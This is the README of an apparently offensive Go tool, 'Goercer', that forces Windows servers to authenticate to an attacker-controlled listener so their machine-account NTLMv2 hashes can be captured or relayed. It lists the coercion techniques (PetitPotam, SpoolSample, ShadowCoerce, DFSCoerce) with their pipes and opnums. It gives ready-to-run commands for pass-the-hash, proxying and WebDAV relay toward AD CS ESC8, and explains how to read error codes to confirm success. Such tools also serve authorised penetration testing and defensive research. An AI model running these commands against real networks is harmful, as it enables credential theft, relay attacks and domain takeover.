# Goercer

NTLM credential coercion tool using authenticated DCERPC with PKT_PRIVACY
(encryption + signing), rebuilt as a modular Go project.

Coerces Windows servers to authenticate to an attacker-controlled listener,
exposing the machine account NTLMv2 hash (which can then be relayed or
captured).

## How it works

1. Authenticates to the target via SMB using NTLM (password or pass-the-hash).
2. Opens a named pipe and binds to an RPC interface with PKT_PRIVACY.
3. Invokes RPC functions with an attacker-controlled UNC/WebDAV path parameter.
4. The target attempts to access that path, authenticating to the attacker's
   listener, which captures the NTLMv2 hash.

## Techniques

| Method        | Protocol  | Pipe          | Opnums                          |
|---------------|-----------|---------------|---------------------------------|
| `petitpotam`  | MS-EFSRPC | efsrpc/lsarpc/samr/netlogon/lsass | 0, 4, 5, 6, 7, 12 |
| `spoolsample` | MS-RPRN   | spoolss       | 62, 65 (+1 open printer)        |
| `shadowcoerce`| MS-FSRVP  | FssagentRpc   | 8, 9                            |
| `dfscoerce`   | MS-DFSNM  | netdfs        | 12, 13                          |

## Usage

```text
# Default (PetitPotam, efsrpc pipe)
./goercer -t <target> -l <listener> -u <user> -d <domain> -p <password>

# Pass-the-hash
./goercer -t <target> -l <listener> -u <user> -d <domain> -H <ntlm_hash>

# SpoolSample
./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample

# Legacy pipe for PetitPotam
./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsarpc

# Specific opnum
./goercer -t <target> -l <listener> -u <user> -d <domain> --opnum 4

# Through a SOCKS5 proxy
./goercer -t <target> -l <listener> -u <user> -d <domain> --proxy socks5://127.0.0.1:1080

# HTTP/WebDAV mode (AD CS ESC8, Exchange relay). Requires a resolvable hostname
# and the WebClient service running on the target.
./goercer -t <target> -l <hostname-or-host@80/path> -u <user> -d <domain> --http

# JSON output
./goercer ... -j
```

See the original tool's README for the WebDAV/HTTP setup requirements
(WebClient hostname limitation, blocking SMB on the listener, Responder `-wv`,
etc.). Those behaviours are preserved.

## Project layout

```text
cmd/goercer/main.go        entrypoint: parse config, connect, dispatch, output
internal/config            Config value object + validation
internal/cli               flag parsing + credential prompting
internal/smbxport          go-smb session wrapper (connect, proxy, open pipe)
internal/ntlm              NTLM message build, NTLMv2 crypto, RC4 stream, MIC
internal/dcerpc            PKT_PRIVACY packets (bind/auth3/request), fault classification
internal/callback          UNC / WebDAV path builders + variations
internal/coercer           Coercer interface, registry, shared bind/opnum engine
```

## Architecture notes

- **No switch statements for dispatch.** Techniques implement the
  `coercer.Coercer` interface and self-register in `init()`.
- **Adding a technique** = one new file in `internal/coercer` implementing
  `Coercer` + a `Register(...)` call in its `init()`. The registry powers
  `coercer.Run` and method discovery, replacing the original `switch` in
  `main`.
- **Fault classification** lives in `internal/dcerpc`. `ERROR_BAD_NETPATH`
  (0x6f7) indicates the coercion likely triggered; `ACCESS_DENIED` (0x5)
  indicates a patched/blocked service. Methods map these via
  `dcerpc.IsCoercionSuccess` / `IsAccessDenied`.
- **The continuous RC4 stream** is preserved in `internal/ntlm.AUTH`. The
  seal handle is initialised once during the bind and never recreated,
  because the RC4 stream MUST remain continuous across stub encryption and
  signature checksums (this is a correctness requirement, not an optimisation).
- **Transport stays go-smb + raw DCERPC.** `internal/smbxport` owns the SMB
  connection and presents a `Pipe` abstraction satisfying `dcerpc.Transport`,
  so the packet layer can be tested/audited independently of a live session.

## Building

Requires Go 1.24+.

```bash
go mod tidy   # first time (generates go.sum)
./build.sh    # or: go build -o goercer ./cmd/goercer
```

## License

MIT
